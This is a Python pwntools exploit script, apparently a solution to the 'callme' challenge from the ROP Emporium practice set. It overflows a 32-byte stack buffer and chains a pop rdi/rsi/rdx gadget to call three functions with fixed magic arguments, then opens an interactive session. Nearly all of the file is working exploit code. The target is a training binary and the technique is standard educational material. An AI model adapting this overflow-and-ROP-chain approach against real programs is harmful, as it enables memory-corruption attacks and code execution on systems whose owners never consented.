#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak callme_one
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

callme_one = exe.symbols['callme_one']
callme_two = exe.symbols['callme_two']
callme_three = exe.symbols['callme_three']

buffer_dim = 32
offset = buffer_dim + 8

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
useful_gadget = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

deadbeef_str = p64(0xdeadbeefdeadbeef)
cafebabe_str = p64(0xcafebabecafebabe)
d00df00d_str = p64(0xd00df00dd00df00d)

payload = [
    b'a' * offset,
    p64(ret),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_one),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_two),

    p64(useful_gadget),
    deadbeef_str,
    cafebabe_str,
    d00df00d_str,
    p64(callme_three),
]

payload = b''.join(payload)

io.sendlineafter(b'', payload)

io.interactive()